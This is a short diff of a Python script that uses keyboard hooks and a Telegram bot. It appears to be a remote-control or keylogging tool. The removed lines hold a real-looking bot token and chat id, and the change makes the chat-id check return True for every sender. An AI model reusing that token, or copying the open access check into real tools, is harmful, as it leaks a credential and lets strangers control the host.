@@ -12,12 +12,12 @@ import os, os.path, platform, ctypes
 import pyHook, pythoncom
 me = singleton.SingleInstance()
 # REPLACE '1234:abcd' BY THE TOKEN OF THE BOT YOU GENERATED!
-token = '333199905:AAGe41C07BqwySlEsDhWtsNzgDqbdHl2SEk'
+token = '1234:abcd'
 # ADD YOUR chat_id TO THE LIST BELOW!
-known_ids = ['255566841']
+known_ids = []
 def checkchat_id(chat_id):
 	# COMMENT THE LINE below if you want this to work just for your telegram id!
-	#return True
+	return True
 	try:
 		return str(chat_id) in known_ids
 	except:
